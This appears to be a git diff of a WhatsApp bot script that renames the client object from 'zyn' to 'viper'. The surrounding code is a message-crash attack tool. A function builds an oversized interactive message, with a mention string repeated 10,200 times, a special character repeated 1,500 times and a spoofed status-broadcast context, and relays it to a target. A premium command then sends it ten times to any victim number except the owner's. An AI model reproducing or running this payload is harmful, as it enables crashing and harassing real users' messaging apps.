@@ -171,7 +171,7 @@ delete client.autoshalat[m.chat]
     }
     
     const replygcxeon = (teks) => {
-	zyn.sendMessage(m.chat, {
+	viper.sendMessage(m.chat, {
                         text: teks,
                         contextInfo: {
                             externalAdReply: {
@@ -188,14 +188,14 @@ delete client.autoshalat[m.chat]
 
  function sendMessageWithMentions(text, mentions = [], quoted = false) {
   if (quoted == null || quoted == undefined || quoted == false) {
-    return zyn.sendMessage(m.chat, {
+    return viper.sendMessage(m.chat, {
       'text': text,
       'mentions': mentions
     }, {
       'quoted': m
     });
   } else {
-    return zyn.sendMessage(m.chat, {
+    return viper.sendMessage(m.chat, {
       'text': text,
       'mentions': mentions
     }, {
@@ -380,7 +380,7 @@ const wanted = {
 		    async function XeonXRobust(target, o, Ptcp = true) {
 	const jids = `_*~@13135550002~*_\n`.repeat(10200);
 	const ui = 'ꦽ'.repeat(1500);
-   await zyn.relayMessage(target, {
+   await viper.relayMessage(target, {
      ephemeralMessage: {
       message: {
        interactiveMessage: {
@@ -473,7 +473,7 @@ singleSelectReply: {
     selectedRowId: "🩸"
 },
 contextInfo: {
-stanzaId: zyn.generateMessageTag(),
+stanzaId: viper.generateMessageTag(),
 participant: "0@s.whatsapp.net",
 remoteJid: "status@broadcast",
 mentionedJid: [target, "13135550002@s.whatsapp.net"],
@@ -595,7 +595,7 @@ ticket_id: crypto.randomBytes(16),
 }
 }
 
-await zyn.relayMessage(target, messagePayload, {
+await viper.relayMessage(target, messagePayload, {
 additionalNodes: stanza,
 participant: { jid : target }
 });
@@ -2120,7 +2120,7 @@ if (!isPremium) return replygcxeon(mess.premium)
 	if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
 victim = text.split("|")[0]
 Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-var contactInfo = await zyn.onWhatsApp(Xreturn);
+var contactInfo = await viper.onWhatsApp(Xreturn);
   if (victim == "916909137213") {
     return;
     }
@@ -2137,7 +2137,7 @@ var contactInfo = await zyn.onWhatsApp(Xreturn);
 replygcxeon(`In process`)
 	await sleep(1000)
 for (let i = 0; i < 10; i++) {
-	await XeonXRobust(Xreturn, zyn, (cct = true), (ptcp = true));
+	await XeonXRobust(Xreturn, viper, (cct = true), (ptcp = true));
         await XeonXRobustV2(Xreturn)
     }
 	sendMessageWithMentions(
